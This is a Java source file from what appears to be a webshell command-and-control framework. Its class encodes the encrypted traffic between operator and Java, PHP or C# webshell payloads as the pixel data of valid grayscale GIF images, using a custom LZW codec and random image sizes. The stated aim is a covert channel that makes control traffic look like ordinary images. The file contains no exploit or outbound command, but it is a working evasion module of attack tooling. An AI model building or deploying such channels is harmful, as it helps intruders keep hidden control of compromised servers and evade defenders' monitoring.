package core.c2profile.chain.impl.gifdata;

import core.c2profile.C2ProfileContext;
import core.c2profile.c2annotation.C2ProfileCryption;
import core.c2profile.c2enum.CryptionChainEnum;
import core.c2profile.chain.AbstractC2ProfileCryptionChain;
import java.io.ByteArrayOutputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;

/**
 * GIF container chain: ciphertext rides as the raster bytes of a valid GIF image
 * (256-entry grayscale palette, 1 byte = 1 pixel). GIF uses LZW (not zlib), so this
 * chain carries a hand-written LZW codec (code-size growth timing verified against
 * JDK ImageIO across the 9/10/11/12-bit boundaries; ImageIO's writer interlace quirk
 * avoided). Trailing zero padding is trimmed on decode (inner chains are hex/base64
 * ASCII, never ending with \0). Payload-side codecs: Java=ImageIO, PHP=GD, C#=System.Drawing.
 */
@C2ProfileCryption(
        ChainName = "gifdata",
        supportPayload = {"JavaDynamicPayload", "PhpDynamicPayload", "CSharpDynamicPayload"}
)
public class CryptionGifDataChain extends AbstractC2ProfileCryptionChain {
    public CryptionGifDataChain() {
    }

    public void init(C2ProfileContext ctx, String payloadName, CryptionChainEnum mode, short cryptionIndex) throws Throwable {
        super.init(ctx, payloadName, mode, cryptionIndex);
    }

    protected boolean isAutoLoadProperties() {
        return true;
    }

    /** ciphertext -> valid GIF (grayscale-ramp raster, random dims, spec LZW) */
    public byte[] encrypt(byte[] data) throws Exception {
        int len = Math.max(1, data.length);
        Random rnd = new Random();
        int w = Math.max(1, (int)Math.sqrt(len) + rnd.nextInt(3));
        int h = Math.max(1, (len + w - 1) / w);
        byte[] raster = new byte[w * h];
        System.arraycopy(data, 0, raster, 0, data.length);

        ByteArrayOutputStream bits = new ByteArrayOutputStream();
        final int[] cur = {0, 0};
        java.util.function.BiConsumer<Integer,Integer> emit = (code, size) -> {
            cur[0] |= code << cur[1];
            cur[1] += size;
            while (cur[1] >= 8) { bits.write(cur[0] & 0xFF); cur[0] >>>= 8; cur[1] -= 8; }
        };
        int clear = 256, eoi = 257, next = 258, size = 9;
        Map<String,Integer> dict = new HashMap<>();
        for (int i = 0; i < 256; i++) dict.put(String.valueOf((char)i), i);
        emit.accept(clear, size);
        if (raster.length > 0) {
            StringBuilder wb = new StringBuilder().append((char)(raster[0] & 0xFF));
            for (int i = 1; i < raster.length; i++) {
                char k = (char)(raster[i] & 0xFF);
                String wk = wb.toString() + k;
                if (dict.containsKey(wk)) {
                    wb.append(k);
                } else {
                    emit.accept(dict.get(wb.toString()), size);
                    if (next < 4096) {
                        dict.put(wk, next++);
                        if (next == (1 << size) + 1 && size < 12) size++;
                    } else {
                        emit.accept(clear, size);
                        dict = new HashMap<>();
                        for (int c = 0; c < 256; c++) dict.put(String.valueOf((char)c), c);
                        next = 258; size = 9;
                    }
                    wb = new StringBuilder().append(k);
                }
            }
            emit.accept(dict.get(wb.toString()), size);
        }
        emit.accept(eoi, size);
        if (cur[1] > 0) bits.write(cur[0] & 0xFF);
        byte[] lzw = bits.toByteArray();

        ByteArrayOutputStream out = new ByteArrayOutputStream();
        out.write(new byte[]{'G','I','F','8','9','a'});
        out.write(w & 0xFF); out.write(w >> 8);
        out.write(h & 0xFF); out.write(h >> 8);
        out.write(0xF7); out.write(0); out.write(0); // GCT 256, bg 0, aspect 0
        for (int i = 0; i < 256; i++) { out.write(i); out.write(i); out.write(i); }
        out.write(0x2C);
        out.write(0); out.write(0); out.write(0); out.write(0);
        out.write(w & 0xFF); out.write(w >> 8);
        out.write(h & 0xFF); out.write(h >> 8);
        out.write(0x00);
        out.write(8); // LZW min code size
        for (int off = 0; off < lzw.length; off += 255) {
            int n = Math.min(255, lzw.length - off);
            out.write(n);
            out.write(lzw, off, n);
        }
        out.write(0);
        out.write(0x3B);
        return out.toByteArray();
    }

    /** valid GIF -> ciphertext (raster, trailing zero padding trimmed) */
    public byte[] decrypt(byte[] gif) throws Exception {
        if (gif == null || gif.length < 13 || gif[0] != 'G' || gif[1] != 'I' || gif[2] != 'F') {
            throw new IllegalArgumentException("not a gif container");
        }
        int off = 6;
        int w = (gif[off] & 0xFF) | ((gif[off + 1] & 0xFF) << 8); off += 2;
        int h = (gif[off] & 0xFF) | ((gif[off + 1] & 0xFF) << 8); off += 2;
        int packed = gif[off] & 0xFF; off += 3;
        if ((packed & 0x80) != 0) off += 3 * (2 << (packed & 7));
        while (off < gif.length) {
            int b = gif[off] & 0xFF; off++;
            if (b == 0x3B) break;
            if (b == 0x21) {
                off++;
                while (off < gif.length) {
                    int n = gif[off] & 0xFF; off++;
                    if (n == 0) break;
                    if (off + n > gif.length) off = gif.length; else off += n;
                }
            } else if (b == 0x2C) {
                off += 9;
                int ip = gif[off - 1] & 0xFF;
                if ((ip & 0x80) != 0) off += 3 * (2 << (ip & 7));
                int min = gif[off] & 0xFF; off++;
                ByteArrayOutputStream lzw = new ByteArrayOutputStream();
                while (off < gif.length) {
                    int n = gif[off] & 0xFF; off++;
                    if (n == 0) break;
                    if (off + n > gif.length) break;
                    lzw.write(gif, off, n); off += n;
                }
                byte[] raw = lzwDecode(lzw.toByteArray(), min);
                int end = raw.length;
                while (end > 0 && raw[end - 1] == 0) end--;
                byte[] r = new byte[end];
                System.arraycopy(raw, 0, r, 0, end);
                return r;
            }
        }
        throw new IllegalArgumentException("no image data in gif");
    }

    private static byte[] lzwDecode(byte[] src, int min) {
        List<byte[]> table = new ArrayList<>(4096);
        for (int i = 0; i < 256; i++) table.add(new byte[]{(byte)i});
        table.add(null); table.add(null);
        int size = min + 1;
        int bitPos = 0;
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        byte[] prevEntry = null;
        int assigned = 258;
        while (true) {
            // Once the bit stream is exhausted every read below returns 0, which is a valid
            // table index -- the loop would then run forever writing one byte per round and
            // growing the output without bound. A stream that ends without EOI is truncated.
            if (bitPos + size > src.length * 8) {
                throw new IllegalArgumentException("truncated lzw stream in gif");
            }
            int code = 0;
            for (int i = 0; i < size; i++) {
                int byteIdx = (bitPos + i) >> 3;
                int bitIdx = (bitPos + i) & 7;
                if (byteIdx < src.length && ((src[byteIdx] >> bitIdx) & 1) != 0) {
                    code |= 1 << i;
                }
            }
            bitPos += size;
            if (code == 256) {
                while (table.size() > 258) table.remove(table.size() - 1);
                size = min + 1;
                prevEntry = null;
                assigned = 258;
                continue;
            }
            if (code == 257) break;
            byte[] entry;
            if (code < table.size() && table.get(code) != null) {
                entry = table.get(code);
            } else if (code == table.size() && prevEntry != null) {
                entry = concat(prevEntry, prevEntry[0]);
            } else {
                throw new IllegalArgumentException("bad lzw code " + code);
            }
            out.write(entry, 0, entry.length);
            if (prevEntry != null && table.size() < 4096) {
                table.add(concat(prevEntry, entry[0]));
            }
            assigned++;
            if (assigned == (1 << size) + 1 && size < 12) size++;
            prevEntry = entry;
        }
        return out.toByteArray();
    }

    private static byte[] concat(byte[] a, byte b) {
        byte[] r = new byte[a.length + 1];
        System.arraycopy(a, 0, r, 0, a.length);
        r[a.length] = b;
        return r;
    }
}
